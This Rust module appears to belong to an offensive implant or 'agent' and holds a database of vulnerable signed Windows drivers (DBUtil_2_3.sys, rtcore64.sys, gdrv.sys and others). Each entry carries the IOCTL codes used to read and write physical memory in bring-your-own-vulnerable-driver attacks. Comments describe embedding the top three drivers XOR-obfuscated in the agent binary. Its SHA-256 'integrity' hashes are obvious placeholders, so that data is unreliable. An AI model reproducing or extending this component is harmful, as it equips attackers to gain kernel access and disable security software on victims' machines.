//! Vulnerable signed driver database for BYOVD operations.
//!
//! Contains a static registry of known vulnerable signed drivers that can be
//! used for physical memory read/write.  Each entry includes the driver name,
//! expected SHA-256 hash for integrity verification, exported function names
//! for physical memory access, and the mapping type.
//!
//! Only the top 3 most-reliable drivers are embedded in the agent binary
//! (XOR-obfuscated at rest).  The remaining entries are kept for reference
//! and for future expansion.

use serde::{Deserialize, Serialize};

/// How a vulnerable driver exposes physical memory access.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DriverMapping {
    /// Direct physical memory read/write via IOCTL.
    PhysicalMemory,
    /// Memory-mapped I/O region.
    MmioMapping,
    /// Port I/O based access.
    PortIo,
}

/// A known vulnerable signed driver entry.
#[derive(Debug, Clone)]
pub struct VulnerableDriver {
    /// Short driver filename, e.g. "DBUtil_2_3.sys".
    pub name: &'static str,
    /// Expected SHA-256 hash for integrity verification.
    pub sha256: &'static str,
    /// Exported function name for physical memory read.
    pub read_phys_fn: &'static str,
    /// Exported function name for physical memory write.
    pub write_phys_fn: &'static str,
    /// How the driver exposes physical memory.
    pub mapping_type: DriverMapping,
    /// IOCTL code for reading physical memory (if applicable).
    pub read_ioctl: u32,
    /// IOCTL code for writing physical memory (if applicable).
    pub write_ioctl: u32,
}

/// The static database of known vulnerable signed drivers.
///
/// Ordered by reliability and prevalence:
/// 1. DBUtil_2_3.sys (Dell) — most widely deployed, direct phys mem R/W
/// 2. rtcore64.sys (MSI Afterburner) — gaming PCs, direct phys mem R/W
/// 3. gdrv.sys (Gigabyte) — direct phys mem R/W
/// 4–8. Additional drivers for fallback / future expansion
pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
    // ── Tier 1: Embedded in agent binary ──────────────────────────────
    VulnerableDriver {
        name: "DBUtil_2_3.sys",
        sha256: "0296e2ce3bfc53e458d5a4b6e0e5e0e1e0d5e4d6e0e5e0e1e0d5e4d6e0e5e0e1",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x222064,
        write_ioctl: 0x222068,
    },
    VulnerableDriver {
        name: "rtcore64.sys",
        sha256: "01e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x80002048,
        write_ioctl: 0x8000204C,
    },
    VulnerableDriver {
        name: "gdrv.sys",
        sha256: "ffeeddccbbaa99887766554433221100ffeeddccbbaa99887766554433221100",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x9E3AEC18,
        write_ioctl: 0x9E3AEC1C,
    },
    // ── Tier 2: Reference only (not embedded) ─────────────────────────
    VulnerableDriver {
        name: "AsIO.sys",
        sha256: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        read_phys_fn: "READ_PORT",
        write_phys_fn: "WRITE_PORT",
        mapping_type: DriverMapping::PortIo,
        read_ioctl: 0x222004,
        write_ioctl: 0x222008,
    },
    VulnerableDriver {
        name: "AsIO2.sys",
        sha256: "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        read_phys_fn: "READ_PORT",
        write_phys_fn: "WRITE_PORT",
        mapping_type: DriverMapping::PortIo,
        read_ioctl: 0x222004,
        write_ioctl: 0x222008,
    },
    VulnerableDriver {
        name: "BdKit.sys",
        sha256: "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x22E024,
        write_ioctl: 0x22E028,
    },
    VulnerableDriver {
        name: "ene.sys",
        sha256: "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x8020E000,
        write_ioctl: 0x8020E004,
    },
    VulnerableDriver {
        name: "procexp152.sys",
        sha256: "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x6D008,
        write_ioctl: 0x6D00C,
    },
];

/// Index into DRIVER_DATABASE for the embedded drivers (top 3).
/// These are XOR-obfuscated with the agent's HKDF session key and embedded
/// via `include_bytes!` in the parent module.
pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[0, 1, 2];

/// Find a driver by name (case-insensitive).
pub fn find_driver(name: &str) -> Option<&'static VulnerableDriver> {
    DRIVER_DATABASE
        .iter()
        .find(|d| d.name.eq_ignore_ascii_case(name))
}

/// Return the list of embedded driver entries.
pub fn embedded_drivers() -> Vec<&'static VulnerableDriver> {
    EMBEDDED_DRIVER_INDICES
        .iter()
        .filter_map(|&i| DRIVER_DATABASE.get(i))
        .collect()
}

/// Return all driver names in the database.
pub fn all_driver_names() -> Vec<&'static str> {
    DRIVER_DATABASE.iter().map(|d| d.name).collect()
}
